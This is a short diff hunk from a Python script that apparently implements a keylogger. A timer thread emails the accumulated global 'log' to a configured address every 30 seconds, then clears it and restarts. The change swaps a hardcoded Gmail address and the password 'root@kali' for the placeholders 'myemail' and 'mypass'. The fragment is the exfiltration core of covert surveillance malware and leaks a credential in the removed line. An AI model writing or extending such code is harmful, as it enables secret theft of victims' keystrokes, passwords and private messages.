@@ -28,7 +28,7 @@ def sendEmail(email,password,message):
 #thread ---threading
 def threadFunction():
     global log
-    sendEmail("edonredforyou123@gmail.com", "root@kali", log)
+    sendEmail("myemail", "mypass", log)
     log = ""
     timerObject = threading.Timer(30,threadFunction)
     timerObject.start()
